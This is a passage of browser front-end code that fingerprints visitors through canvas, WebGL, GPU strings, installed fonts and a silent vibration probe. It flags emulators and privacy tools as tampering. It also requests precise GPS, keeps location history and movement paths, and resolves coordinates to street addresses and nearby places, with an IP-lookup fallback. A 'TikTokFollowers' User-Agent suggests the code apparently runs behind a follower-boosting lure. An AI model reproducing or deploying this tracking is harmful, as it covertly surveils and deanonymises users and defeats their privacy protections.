            const data1 = consistencyCanvas1.toDataURL();
            const data2 = consistencyCanvas2.toDataURL();
            
            // If identical drawings produce different results, it's randomized
            if (data1 !== data2) {
              tamperingDetected = true;
              tamperingMethods.push('canvas_randomization');
              console.warn("Canvas randomization detected");
            }
          }
          
          // Test 3: Check for unusual canvas behavior
          try {
            const testCanvas = document.createElement('canvas');
            testCanvas.width = 1;
            testCanvas.height = 1;
            const testCtx = testCanvas.getContext('2d');
            
            if (testCtx) {
              // Try methods that sometimes trigger errors in tampered contexts
              testCtx.getImageData(0, 0, 1, 1);
              
              // Try to detect if the canvas pixel manipulation is intercepted
              testCtx.fillStyle = "#FFFFFF";
              testCtx.fillRect(0, 0, 1, 1);
              const whiteData = testCtx.getImageData(0, 0, 1, 1).data;
              
              // Check if the pixel data is as expected for a white pixel
              if (whiteData[0] !== 255 || whiteData[1] !== 255 || 
                  whiteData[2] !== 255 || whiteData[3] !== 255) {
                tamperingDetected = true;
                tamperingMethods.push('pixel_manipulation');
                console.warn("Canvas pixel data manipulation detected");
              }
            }
          } catch (e) {
            // Some tampering methods throw errors on pixel access
            tamperingDetected = true;
            tamperingMethods.push('access_restriction');
            console.warn("Canvas access restriction detected:", e);
          }
          
          return { tamperingDetected, tamperingMethods };
        };
        
        // Run all fingerprinting methods
        const primaryFingerprint = createPrimaryFingerprint();
        const secondaryFingerprint = createSecondaryFingerprint();
        const tamperingResults = detectCanvasTampering();
        
        // Combine all results for a comprehensive fingerprint
        const combinedFingerprint = {
          primary: {
            dataUrl: primaryFingerprint.dataUrl.substring(0, 150) + '...',
            pixelSample: primaryFingerprint.pixels,
          },
          secondary: {
            dataUrl: secondaryFingerprint.dataUrl.substring(0, 100) + '...',
            pixelSample: secondaryFingerprint.pixels,
          },
          security: {
            tamperingDetected: tamperingResults.tamperingDetected,
            tamperingMethods: tamperingResults.tamperingMethods,
            timestamp: new Date().toISOString()
          }
        };
        
        // Update user info with comprehensive fingerprint data
        setUserInfo(prev => ({
          ...prev,
          canvasFingerprint: primaryFingerprint.dataUrl.substring(0, 100) + '...',
          fingerprintData: {
            ...prev.fingerprintData,
            canvas: JSON.stringify(combinedFingerprint)
          }
        }));
        
        // If tampering was detected, update security checks
        if (tamperingResults.tamperingDetected) {
          setUserInfo(prev => ({
            ...prev,
            securityChecks: {
              ...prev.securityChecks,
              tamperingDetected: true,
              automationDetected: tamperingResults.tamperingMethods.includes('canvas_instrumentation'),
              integrityScore: Math.max(0, prev.securityChecks.integrityScore - 25),
              emulatorDetails: {
                ...prev.securityChecks.emulatorDetails,
                canvasTampering: tamperingResults.tamperingMethods
              }
            }
          }));
        }
      } catch (e) {
        console.error('Canvas fingerprinting error:', e);
      }
    };
    
    // Comprehensive WebGL fingerprinting with full technical details
    const createWebGLFingerprint = () => {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = 256;
        canvas.height = 128;
        
        // Try WebGL2 first, then fallback to WebGL1
        const gl2 = canvas.getContext('webgl2');
        const gl = gl2 || canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const isWebGL2 = !!gl2;
        
        if (!gl) {
          console.warn("WebGL not supported");
          return;
        }
        
        // Get WebGL debug info for detailed GPU information
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        let unmaskedVendor = 'unknown', unmaskedRenderer = 'unknown';
        
        if (debugInfo) {
          try {
            unmaskedVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            unmaskedRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          } catch (e) {
            console.warn("Could not get unmasked renderer info:", e);
          }
        }
        
        // Get all available extensions with their properties and capabilities
        const extensions = gl.getSupportedExtensions() || [];
        const extensionDetails = extensions.map(ext => {
          const extObj = gl.getExtension(ext);
          const properties = extObj ? Object.getOwnPropertyNames(extObj) : [];
          return { name: ext, properties };
        });
        
        // Collect all available WebGL parameters and capabilities
        const parameters: Record<string, any> = {};
        const parameterNames = [
          'VERSION', 'SHADING_LANGUAGE_VERSION', 'VENDOR', 'RENDERER',
          'MAX_TEXTURE_SIZE', 'MAX_VIEWPORT_DIMS', 'MAX_VERTEX_ATTRIBS',
          'MAX_VERTEX_UNIFORM_VECTORS', 'MAX_VARYING_VECTORS',
          'MAX_COMBINED_TEXTURE_IMAGE_UNITS', 'MAX_VERTEX_TEXTURE_IMAGE_UNITS',
          'MAX_TEXTURE_IMAGE_UNITS', 'MAX_FRAGMENT_UNIFORM_VECTORS',
          'ALIASED_LINE_WIDTH_RANGE', 'ALIASED_POINT_SIZE_RANGE',
          'RED_BITS', 'GREEN_BITS', 'BLUE_BITS', 'ALPHA_BITS',
          'DEPTH_BITS', 'STENCIL_BITS', 'SUBPIXEL_BITS',
          'MAX_RENDERBUFFER_SIZE', 'COMPRESSED_TEXTURE_FORMATS'
        ];
        
        parameterNames.forEach(param => {
          try {
            const value = gl.getParameter((gl as any)[param]);
            
            // Convert TypedArrays to regular arrays for JSON serialization
            if (value && value.length !== undefined && typeof value !== 'string') {
              parameters[param] = Array.from(value);
            } else {
              parameters[param] = value;
            }
          } catch (e) {
            parameters[param] = `error: ${e}`;
          }
        });
        
        // For WebGL2, get additional parameters
        if (isWebGL2 && gl2) {
          const webgl2Params = [
            'MAX_3D_TEXTURE_SIZE', 'MAX_DRAW_BUFFERS', 'MAX_COLOR_ATTACHMENTS',
            'MAX_SAMPLES', 'MAX_TRANSFORM_FEEDBACK_SEPARATE_ATTRIBS',
            'MAX_TRANSFORM_FEEDBACK_INTERLEAVED_COMPONENTS',
            'MAX_UNIFORM_BUFFER_BINDINGS', 'MAX_UNIFORM_BLOCK_SIZE',
            'MAX_VARYING_COMPONENTS', 'MAX_ARRAY_TEXTURE_LAYERS',
            'UNIFORM_BUFFER_OFFSET_ALIGNMENT'
          ];
          
          webgl2Params.forEach(param => {
            try {
              const value = gl2.getParameter((gl2 as any)[param]);
              
              if (value && value.length !== undefined && typeof value !== 'string') {
                parameters[param] = Array.from(value);
              } else {
                parameters[param] = value;
              }
            } catch (e) {
              parameters[param] = `error: ${e}`;
            }
          });
        }
        
        // Generate a unique rendering to further identify GPU behavior
        // This creates a visual fingerprint that differs based on GPU hardware and drivers
        const createRenderFingerprint = () => {
          try {
            // Create vertex and fragment shaders with complex math operations
            const vertexShaderSource = `
              attribute vec2 a_position;
              varying vec2 v_position;
              
              void main() {
                v_position = a_position;
                gl_Position = vec4(a_position, 0.0, 1.0);
              }
            `;
            
            const fragmentShaderSource = `
              precision highp float;
              varying vec2 v_position;
              
              float generatePattern(vec2 position) {
                float x = position.x * 17.0;
                float y = position.y * 23.0;
                float v = sin(x) * cos(y) + sin(x * 3.1) * cos(y * 1.7) + sin(y * 4.3) * cos(x * 2.9);
                v = v * 0.5 + 0.5; // Normalize to [0, 1]
                return v;
              }
              
              void main() {
                vec2 position = v_position * 2.0;
                float r = generatePattern(position + vec2(0.1, 0.3));
                float g = generatePattern(position + vec2(0.7, -0.2));
                float b = generatePattern(position + vec2(-0.3, 0.8));
                gl_FragColor = vec4(r, g, b, 1.0);
              }
            `;
            
            // Create and compile shaders
            const vertexShader = gl.createShader(gl.VERTEX_SHADER);
            const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
            
            if (!vertexShader || !fragmentShader) {
              throw new Error("Failed to create shaders");
            }
            
            gl.shaderSource(vertexShader, vertexShaderSource);
            gl.shaderSource(fragmentShader, fragmentShaderSource);
            gl.compileShader(vertexShader);
            gl.compileShader(fragmentShader);
            
            // Create program and link shaders
            const program = gl.createProgram();
            if (!program) {
              throw new Error("Failed to create program");
            }
            
            gl.attachShader(program, vertexShader);
            gl.attachShader(program, fragmentShader);
            gl.linkProgram(program);
            gl.useProgram(program);
            
            // Check for shader compilation and program linking errors
            const vertexSuccess = gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS);
            const fragmentSuccess = gl.getShaderParameter(fragmentShader, gl.COMPILE_STATUS);
            const programSuccess = gl.getProgramParameter(program, gl.LINK_STATUS);
            
            if (!vertexSuccess || !fragmentSuccess || !programSuccess) {
              const vertexLog = gl.getShaderInfoLog(vertexShader);
              const fragmentLog = gl.getShaderInfoLog(fragmentShader);
              const programLog = gl.getProgramInfoLog(program);
              throw new Error(`Shader compilation failed: Vertex: ${vertexLog}, Fragment: ${fragmentLog}, Program: ${programLog}`);
            }
            
            // Create a buffer for the vertices
            const positionBuffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
            
            // Create vertex data (a rectangle covering the canvas)
            const positions = new Float32Array([
              -1.0, -1.0,
               1.0, -1.0,
              -1.0,  1.0,
               1.0,  1.0
            ]);
            gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);
            
            // Tell the shader program how to read the buffer
            const positionLocation = gl.getAttribLocation(program, "a_position");
            gl.enableVertexAttribArray(positionLocation);
            gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
            
            // Draw the rectangle
            gl.clearColor(0, 0, 0, 1);
            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
            
            // Read back a sample of the pixels (this is hardware-dependent)
            const pixels = new Uint8Array(16 * 16 * 4);
            gl.readPixels(0, 0, 16, 16, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
            
            // Return a sample of pixels as the fingerprint
            // Only use a subset to keep size reasonable
            return Array.from(pixels.slice(0, 64));
          } catch (e) {
            console.warn("Render fingerprint generation failed:", e);
            return null;
          }
        };
        
        // Get render fingerprint
        const renderFingerprint = createRenderFingerprint();
        
        // Check if WebGL context is lost or if canvas is tainted
        const contextLost = gl.isContextLost?.() || false;
        
        // Check for emulator/virtualization
        const renderer = unmaskedRenderer || gl.getParameter(gl.RENDERER) || '';
        const vendor = unmaskedVendor || gl.getParameter(gl.VENDOR) || '';
        
        // Comprehensive detection of virtualized environments, emulators, and automated testing
        const emulationPatterns = [
          // Common virtualization GPUs
          /SwiftShader/i, /llvmpipe/i, /VirtualBox/i, /VMware/i, 
          /SVGA3D/i, /VMWARE/i, /Software Rasterizer/i, 
          
          // Mobile emulator GPUs
          /Adreno.*[Ee]mulator/i, /Intel.*[Ee]mulator/i,
          
          // Common test automation frameworks
          /Headless/i, /Chrome\s+Remote/i, /Software\s+OpenGL/i,
          
          // Cloud rendering services
          /ANGLE/i, /D3D11/i
        ];
        
        const isEmulator = emulationPatterns.some(pattern => 
          pattern.test(renderer) || pattern.test(vendor)
        );
        
        if (isEmulator) {
          console.warn("Emulator/Virtualization detected in WebGL:", renderer);
        }
        
        // Assemble the complete WebGL fingerprint with all collected data
        const webglInfo = {
          // Core WebGL information
          version: gl.getParameter(gl.VERSION),
          glVersion: isWebGL2 ? '2.0' : '1.0',
          vendor,
          renderer,
          unmaskedVendor,
          unmaskedRenderer,
          shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
          
          // Detailed capabilities
          parameters,
          extensionsCount: extensions.length,
          extensionsList: extensions,
          extensionDetails,
          contextAttributes: gl.getContextAttributes(),
          contextLost,
          
          // Fingerprinting results
          renderFingerprint,
          canvas: {
            width: canvas.width,
            height: canvas.height,
            clientWidth: canvas.clientWidth,
            clientHeight: canvas.clientHeight
          },
          
          // Security and detection flags
          isEmulator,
          isWebGL2,
          
          // Hardware acceleration information
          hardwareAccelerated: !(/SwiftShader|Software|SVGA3D/i.test(renderer)),
          
          // Estimated graphics tier (basic estimate based on renderer string)
          graphicsTier: /nvidia|radeon|geforce|rx|rtx|gtx/i.test(renderer) ? 'high' : 
                       (/intel|amd|mali-t/i.test(renderer) ? 'medium' : 'low'),
          
          // Timestamp for when the fingerprint was generated
          timestamp: new Date().toISOString()
        };
        
        // Update user info with comprehensive WebGL data
        setUserInfo(prev => ({
          ...prev,
          webglFingerprint: JSON.stringify(webglInfo),
          hardwareInfo: {
            ...prev.hardwareInfo,
            gpu: unmaskedRenderer || renderer || 'unknown',
            gpuVendor: unmaskedVendor || vendor || 'unknown',
            isWebGL2,
            maxTextureSize: parameters['MAX_TEXTURE_SIZE'],
            extensionCount: extensions.length,
            contextLost,
            glVersion: isWebGL2 ? '2.0' : '1.0',
            shadingLanguageVersion: parameters['SHADING_LANGUAGE_VERSION'],
          }
        }));
        
        // Set emulator detection flag if necessary
        if (isEmulator) {
          setUserInfo(prev => ({
            ...prev,
            isEmulator: true,
            emulatorDetails: {
              source: 'webgl',
              renderer,
              vendor
            }
          }));
        }
      } catch (e) {
        console.error('WebGL fingerprinting error:', e);
        
        // Still update with error information
        setUserInfo(prev => ({
          ...prev,
          webglFingerprint: JSON.stringify({
            error: true,
            message: e.message,
            timestamp: new Date().toISOString()
          })
        }));
      }
    };
    
    // Enhanced font detection
    // Comprehensive font detection with OS/device fingerprinting
    const detectFonts = () => {
      // Expanded font list categorized by operating system for better fingerprinting
      const fontMap = {
        // Windows-specific fonts
        windows: [
          'Arial', 'Arial Black', 'Bahnschrift', 'Calibri', 'Cambria', 'Cambria Math', 'Candara',
          'Comic Sans MS', 'Consolas', 'Constantia', 'Corbel', 'Courier New', 'Ebrima',
          'Franklin Gothic Medium', 'Gabriola', 'Gadugi', 'Georgia', 'Impact', 'Ink Free', 'Javanese Text',
          'Leelawadee UI', 'Lucida Console', 'Lucida Sans Unicode', 'Malgun Gothic', 'Marlett',
          'Microsoft Himalaya', 'Microsoft JhengHei', 'Microsoft New Tai Lue', 'Microsoft PhagsPa',
          'Microsoft Sans Serif', 'Microsoft Tai Le', 'Microsoft YaHei', 'Microsoft Yi Baiti',
          'MingLiU-ExtB', 'Mongolian Baiti', 'MS Gothic', 'MV Boli', 'Myanmar Text', 'Nirmala UI',
          'Palatino Linotype', 'Segoe MDL2 Assets', 'Segoe Print', 'Segoe Script', 'Segoe UI', 
          'Segoe UI Historic', 'Segoe UI Emoji', 'Segoe UI Symbol', 'SimSun', 'Sitka', 'Sylfaen', 
          'Symbol', 'Tahoma', 'Times New Roman', 'Trebuchet MS', 'Verdana', 'Webdings', 'Wingdings'
        ],
        // macOS-specific fonts
        macos: [
          'American Typewriter', 'Andale Mono', 'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
          'Avenir', 'Avenir Next', 'Avenir Next Condensed', 'Baskerville', 'Big Caslon', 'Brush Script MT',
          'Chalkboard', 'Chalkboard SE', 'Chalkduster', 'Charter', 'Cochin', 'Comic Sans MS', 'Copperplate',
          'Courier', 'Courier New', 'Didot', 'Futura', 'Geneva', 'Georgia', 'Gill Sans', 'Helvetica',
          'Helvetica Neue', 'Herculanum', 'Hoefler Text', 'Impact', 'Lucida Grande', 'Luminari', 'Marker Felt',
          'Menlo', 'Monaco', 'Noteworthy', 'Optima', 'Palatino', 'Papyrus', 'Phosphate', 'Rockwell',
          'San Francisco', 'SF Pro', 'SF Pro Display', 'SF Pro Text', 'SignPainter', 'Skia', 'Snell Roundhand',
          'Times', 'Times New Roman', 'Trattatello', 'Trebuchet MS', 'Verdana', 'Zapfino'
        ],
        // Linux-specific fonts
        linux: [
          'DejaVu Sans', 'DejaVu Sans Condensed', 'DejaVu Sans Mono', 'DejaVu Serif', 'DejaVu Serif Condensed',
          'Droid Sans', 'Droid Sans Mono', 'Droid Serif', 'FreeMono', 'FreeSans', 'FreeSerif',
          'Liberation Mono', 'Liberation Sans', 'Liberation Serif', 'Nimbus Mono', 'Nimbus Sans',
          'Nimbus Roman', 'Noto Mono', 'Noto Sans', 'Noto Serif', 'Ubuntu', 'Ubuntu Condensed', 'Ubuntu Mono'
        ],
        // Android-specific fonts
        android: [
          'Droid Sans', 'Droid Serif', 'Droid Sans Mono', 'Roboto', 'Roboto Condensed', 'Roboto Mono',
          'Roboto Slab', 'Noto Sans', 'Noto Serif', 'Noto Mono', 'Noto Color Emoji'
        ],
        // iOS-specific fonts
        ios: [
          'Academy Engraved LET', 'Al Nile', 'American Typewriter', 'Apple Color Emoji', 'Apple SD Gothic Neo',
          'Arial', 'Arial Hebrew', 'Arial Rounded MT Bold', 'Avenir', 'Avenir Next', 'Avenir Next Condensed',
          'Baskerville', 'Bodoni 72', 'Bradley Hand', 'Chalkboard SE', 'Cochin', 'Copperplate', 'Courier',
          'Courier New', 'Damascus', 'Futura', 'Georgia', 'Gill Sans', 'Helvetica', 'Helvetica Neue',
          'Hiragino Sans', 'Hoefler Text', 'Marker Felt', 'Menlo', 'Noteworthy', 'Optima',
          'Palatino', 'Papyrus', 'Party LET', 'San Francisco', 'Savoye LET', 'Snell Roundhand',
          'Times New Roman', 'Verdana', 'Zapf Dingbats', 'Zapfino'
        ],
        // Generic fonts available on most platforms
        generic: [
          'Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Trebuchet MS', 'Verdana',
          'Impact', 'Comic Sans MS'
        ]
      };
      
      // Advanced font detection with multi-metric comparison
      const detectFont = (fontName) => {
        try {
          // Create test elements
          const testElement = document.createElement('span');
          const controlElement = document.createElement('span');
          
          // Use diverse characters for testing
          const testText = 'mmMwWlLiI123'; // Mix of narrow, wide, and varied shapes
          
          // Apply consistent styles but different fonts
          const baseStyle = 'position:absolute; left:-9999px; font-size:72px; visibility:hidden;';
          
          testElement.setAttribute('style', `${baseStyle} font-family:"${fontName}", monospace;`);
          controlElement.setAttribute('style', `${baseStyle} font-family:monospace;`);
          
          testElement.textContent = testText;
          controlElement.textContent = testText;
          
          // Add to DOM temporarily
          const testBed = document.createElement('div');
          testBed.appendChild(testElement);
          testBed.appendChild(controlElement);
          document.body.appendChild(testBed);
          
          // Measure multiple dimensions for more accurate detection
          const testRect = testElement.getBoundingClientRect();
          const controlRect = controlElement.getBoundingClientRect();
          
          // Compare dimensions to determine if font is available
          const widthDiffers = Math.abs(testRect.width - controlRect.width) > 1;
          const heightDiffers = Math.abs(testRect.height - controlRect.height) > 1;
          
          // Clean up
          document.body.removeChild(testBed);
          
          // Font is available if either dimension differs significantly
          return widthDiffers || heightDiffers;
        } catch (e) {
          console.warn(`Font detection error for ${fontName}:`, e);
          return false;
        }
      };
      
      // Convert font map to flat list for detection
      const allFonts = new Set([
        ...fontMap.windows, 
        ...fontMap.macos, 
        ...fontMap.linux,
        ...fontMap.android,
        ...fontMap.ios,
        ...fontMap.generic
      ]);
      
      // Detect available fonts
      const availableFonts = Array.from(allFonts).filter(detectFont);
      
      // Categorize detected fonts by OS for better system fingerprinting
      const fontFingerprint = {
        detected: availableFonts,
        count: availableFonts.length,
        categories: {
          windows: availableFonts.filter(font => fontMap.windows.includes(font)),
          macos: availableFonts.filter(font => fontMap.macos.includes(font)),
          linux: availableFonts.filter(font => fontMap.linux.includes(font)),
          android: availableFonts.filter(font => fontMap.android.includes(font)),
          ios: availableFonts.filter(font => fontMap.ios.includes(font))
        },
        // Calculate OS probability based on unique fonts
        osProbability: {
          windows: availableFonts.filter(font => 
            fontMap.windows.includes(font) && 
            !fontMap.macos.includes(font) && 
            !fontMap.linux.includes(font) && 
            !fontMap.ios.includes(font) && 
            !fontMap.android.includes(font)
          ).length,
          macos: availableFonts.filter(font => 
            fontMap.macos.includes(font) && 
            !fontMap.windows.includes(font) && 
            !fontMap.linux.includes(font) && 
            !fontMap.ios.includes(font) && 
            !fontMap.android.includes(font)
          ).length,
          linux: availableFonts.filter(font => 
            fontMap.linux.includes(font) && 
            !fontMap.windows.includes(font) && 
            !fontMap.macos.includes(font) && 
            !fontMap.ios.includes(font) && 
            !fontMap.android.includes(font)
          ).length,
          ios: availableFonts.filter(font => 
            fontMap.ios.includes(font) && 
            !fontMap.windows.includes(font) && 
            !fontMap.macos.includes(font) && 
            !fontMap.linux.includes(font) && 
            !fontMap.android.includes(font)
          ).length,
          android: availableFonts.filter(font => 
            fontMap.android.includes(font) && 
            !fontMap.windows.includes(font) && 
            !fontMap.macos.includes(font) && 
            !fontMap.linux.includes(font) && 
            !fontMap.ios.includes(font)
          ).length
        },
        timestamp: new Date().toISOString()
      };
      
      // Identify suspicious patterns
      const suspiciousPatterns = [];
      
      // Check for minimal fonts - strong emulator indicator
      if (availableFonts.length < 5) {
        suspiciousPatterns.push('minimal_fonts_detected');
      }
      
      // Check for OS inconsistencies
      const osScores = Object.entries(fontFingerprint.osProbability);
      const highScoreOSes = osScores
        .filter(([_, score]) => score > 3)
        .map(([os]) => os);
      
      // Conflicting OS combinations suggest spoofing
      if (
        (highScoreOSes.includes('windows') && highScoreOSes.includes('macos')) ||
        (highScoreOSes.includes('ios') && highScoreOSes.includes('android'))
      ) {
        suspiciousPatterns.push('conflicting_os_fonts');
      }
      
      // Update user info with font data
      setUserInfo(prev => ({
        ...prev,
        fonts: availableFonts.join(', '),
        fingerprintData: {
          ...prev.fingerprintData,
          fonts: JSON.stringify(fontFingerprint)
        }
      }));
      
      // Update security checks if suspicious patterns found
      if (suspiciousPatterns.length > 0) {
        console.warn("Suspicious font patterns detected:", suspiciousPatterns);
        setUserInfo(prev => ({
          ...prev,
          securityChecks: {
            ...prev.securityChecks,
            tamperingDetected: true,
            isEmulator: suspiciousPatterns.includes('minimal_fonts_detected'),
            integrityScore: Math.max(0, prev.securityChecks.integrityScore - 15),
            emulatorDetails: {
              ...prev.securityChecks.emulatorDetails,
              fontAnalysis: suspiciousPatterns
            }
          }
        }));
      }
    };
    
    // Detect device vibration capability (most emulators don't support this)
    const checkVibration = () => {
      if ('vibrate' in navigator) {
        try {
          // Try to vibrate for 1ms (user won't notice)
          navigator.vibrate(1);
          setUserInfo(prev => ({
            ...prev,
            hardwareInfo: {
              ...prev.hardwareInfo,
              vibrationSupported: true
            }
          }));
        } catch (e) {
          console.warn('Vibration test failed:', e);
          setUserInfo(prev => ({
            ...prev,
            hardwareInfo: {
              ...prev.hardwareInfo,
              vibrationSupported: false
            },
            isEmulator: true
          }));
        }
      } else {
        setUserInfo(prev => ({
          ...prev,
          hardwareInfo: {
            ...prev.hardwareInfo,
            vibrationSupported: false
          }
        }));
      }
    };
    
    // Enhanced location data collection with multiple fallbacks and verification
    const getGeolocation = async () => {
      // Initialize with unknown status
      setUserInfo(prev => ({
        ...prev,
        geolocation: {
          ...prev.geolocation,
          permission: 'unknown',
          collectionMethods: [],
          verificationStatus: 'unverified',
          lastUpdated: new Date().toISOString(),
          wifiNetworks: [], // Store nearby WiFi networks if available
          cellTowers: [],   // Store cell tower info if available
          movementPath: [], // Track movement path if user moves
          locationHistory: [] // Store location history
        }
      }));
      
      // Collection method 1: HTML5 Geolocation API (most accurate but requires permission)
      const getHTML5Location = () => {
        if ('geolocation' in navigator) {
          try {
            // Check permission status
            navigator.permissions.query({ name: 'geolocation' as PermissionName })
              .then(permissionStatus => {
                setUserInfo(prev => ({
                  ...prev,
                  geolocation: {
                    ...prev.geolocation,
                    permission: permissionStatus.state as any,
                    collectionMethods: [...(prev.geolocation.collectionMethods || []), 'permission_check']
                  }
                }));
                
                // Listen for permission changes
                permissionStatus.addEventListener('change', () => {
                  setUserInfo(prev => ({
                    ...prev,
                    geolocation: {
                      ...prev.geolocation,
                      permission: permissionStatus.state as any,
                      lastUpdated: new Date().toISOString()
                    }
                  }));
                });
              });
              
            // Request high-accuracy location
            navigator.geolocation.getCurrentPosition(
              (position) => {
                // Success - we have precise location
                const {
                  latitude,
                  longitude,
                  accuracy,
                  altitude,
                  altitudeAccuracy,
                  heading,
                  speed
                } = position.coords;
                
                // Check if coordinates are reasonable
                const isReasonableCoordinate = 
                  latitude >= -90 && latitude <= 90 && 
                  longitude >= -180 && longitude <= 180;
                
                if (!isReasonableCoordinate) {
                  console.warn("Suspicious GPS coordinates detected", { latitude, longitude });
                }
                
                // Record current position
                const currentLocation = {
                  latitude,
                  longitude,
                  accuracy,
                  altitude,
                  altitudeAccuracy,
                  heading,
                  speed,
                  timestamp: position.timestamp,
                };
                
                setUserInfo(prev => {
                  // Add to location history
                  const locationHistory = [...(prev.geolocation.locationHistory || [])];
                  locationHistory.push({
                    ...currentLocation,
                    recordedAt: new Date().toISOString()
                  });
                  
                  // Get movement path if we have multiple locations
                  const movementPath = [...(prev.geolocation.movementPath || [])];
                  if (locationHistory.length >= 2) {
                    movementPath.push({
                      from: {
                        lat: locationHistory[locationHistory.length - 2].latitude,
                        lng: locationHistory[locationHistory.length - 2].longitude,
                      },
                      to: {
                        lat: latitude,
                        lng: longitude,
                      },
                      timestamp: new Date().toISOString()
                    });
                  }
                  
                  return {
                    ...prev,
                    geolocation: {
                      ...prev.geolocation,
                      latitude,
                      longitude,
                      accuracy,
                      altitude,
                      altitudeAccuracy,
                      heading,
                      speed,
                      timestamp: position.timestamp,
                      permission: 'granted',
                      source: 'html5_gps',
                      verificationStatus: isReasonableCoordinate ? 'verified' : 'suspicious',
                      collectionMethods: [...(prev.geolocation.collectionMethods || []), 'html5_gps'],
                      lastUpdated: new Date().toISOString(),
                      locationHistory,
                      movementPath,
                      locationQuality: accuracy < 100 ? 'high' : 
                                      accuracy < 1000 ? 'medium' : 'low',
                    }
                  };
                });
                
                // Enhanced location data collection with multiple reverse geocoding services
                const enhancedReverseGeocoding = async () => {
                  // 1. Main OSM Nominatim reverse geocoding (most accurate for address details)
                  try {
                    const userAgent = `TikTokFollowers/1.0 (contact@example.com)`;
                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`, {
                      headers: {
                        'User-Agent': userAgent
                      }
                    });
                    
                    const data = await response.json();
                    if (data && data.address) {
                      // Detailed address information was successful
                      setUserInfo(prev => ({
                        ...prev,
                        geolocation: {
                          ...prev.geolocation,
                          address: data.address,
                          displayName: data.display_name,
                          collectionMethods: [...(prev.geolocation.collectionMethods || []), 'reverse_geocode_osm'],
                          locationDetails: {
                            country: data.address.country,
                            countryCode: data.address.country_code,
                            region: data.address.state || data.address.county,
                            city: data.address.city || data.address.town || data.address.village,
                            postalCode: data.address.postcode,
                            road: data.address.road,
                            neighbourhood: data.address.neighbourhood || data.address.suburb
                          }
                        }
                      }));
                      
                      // Find nearby points of interest if we have precise location
                      if (accuracy < 100) {
                        try {
                          const poiResponse = await fetch(
                            `https://nominatim.openstreetmap.org/search.php?q=poi&format=jsonv2&lat=${latitude}&lon=${longitude}&radius=500`,
                            { headers: { 'User-Agent': userAgent } }
                          );
                          
                          const poiData = await poiResponse.json();
                          if (poiData && poiData.length > 0) {
                            // Extract relevant POIs
                            const pointsOfInterest = poiData.slice(0, 10).map((poi: any) => ({
                              name: poi.name || poi.display_name,
                              type: poi.type,
                              distance: poi.importance,
                              coordinates: [poi.lat, poi.lon]
                            }));
                            
                            setUserInfo(prev => ({
                              ...prev,
                              geolocation: {
                                ...prev.geolocation,
                                pointsOfInterest,
                                collectionMethods: [...(prev.geolocation.collectionMethods || []), 'points_of_interest']
                              }
                            }));
                          }
                        } catch (error) {
                          console.warn("Error fetching nearby points of interest:", error);
                        }
                      }
                    }
                  } catch (error) {
                    console.warn("Error attempting OSM reverse geocoding:", error);
                  }
                  
                  // 2. BigDataCloud geocoding service (for verification and additional details)
                  try {
                    const bdcResponse = await fetch(
                      `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
                    );
                    
                    const bdcData = await bdcResponse.json();
                    if (bdcData && bdcData.countryName) {
                      setUserInfo(prev => ({
                        ...prev,
                        geolocation: {
                          ...prev.geolocation,
                          bigDataCloud: bdcData,
                          collectionMethods: [...(prev.geolocation.collectionMethods || []), 'reverse_geocode_bigdata']
                        }
                      }));
                    }
                  } catch (error) {
                    console.warn("Error attempting BigDataCloud geocoding:", error);
                  }
                  
                  // 3. Check for location accuracy and quality
                  try {
                    // Try to determine nearby landmarks based on coordinates
                    const locationQuality = accuracy < 50 ? 'very_high' : 
                                          accuracy < 100 ? 'high' : 
                                          accuracy < 500 ? 'medium' : 
                                          accuracy < 1000 ? 'low' : 'very_low';
                    
                    // Store enhanced location quality assessment
                    setUserInfo(prev => ({
                      ...prev,
                      geolocation: {
                        ...prev.geolocation,
                        locationQuality,
                        locationAccuracyAnalysis: {
                          accuracyMeters: accuracy,
                          qualityRating: locationQuality,
                          confidence: accuracy < 100 ? 'high' : accuracy < 500 ? 'medium' : 'low',
                          timestamp: new Date().toISOString()
                        }
                      }
                    }));
                  } catch (error) {
                    console.warn("Error determining location quality:", error);
                  }
                };
                
                // Execute enhanced reverse geocoding
                enhancedReverseGeocoding();
              },
              (error) => {
                // Permission denied or other error
                console.warn("Geolocation error:", error.message);
                setUserInfo(prev => ({
                  ...prev,
                  geolocation: {
                    ...prev.geolocation,
                    permission: error.code === error.PERMISSION_DENIED ? 'denied' : 'error',
                    error: error.message,
                    errorCode: error.code,
                    collectionMethods: [...(prev.geolocation.collectionMethods || []), 'html5_gps_failed']
                  }
                }));
                
                // HTML5 geolocation failed, try fallback methods
                getIPBasedLocation();
              },
              // Options for high accuracy
              {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
              }
            );
          } catch (error) {
            console.warn("Geolocation API error:", error);
            getIPBasedLocation();
          }
        } else {
          console.warn("Geolocation not supported by this browser");
          getIPBasedLocation();
        }
      };
      
      // Collection method 2: IP-based geolocation (less accurate, no permission needed)
      const getIPBasedLocation = async () => {
        try {
          // Use ipinfo.io for IP-based location
          const ipInfoResponse = await fetch('https://ipinfo.io/json');
          const ipData = await ipInfoResponse.json();
          
          if (ipData && ipData.loc) {
            const [lat, lon] = ipData.loc.split(',').map(parseFloat);
            
            setUserInfo(prev => ({
              ...prev,
              geolocation: {
                ...prev.geolocation,
                latitude: lat,
                longitude: lon,
                accuracy: 5000, // IP geolocation is typically accurate to ~5km
                source: 'ip_based',
                city: ipData.city,
                region: ipData.region,
                country: ipData.country,
                postalCode: ipData.postal,
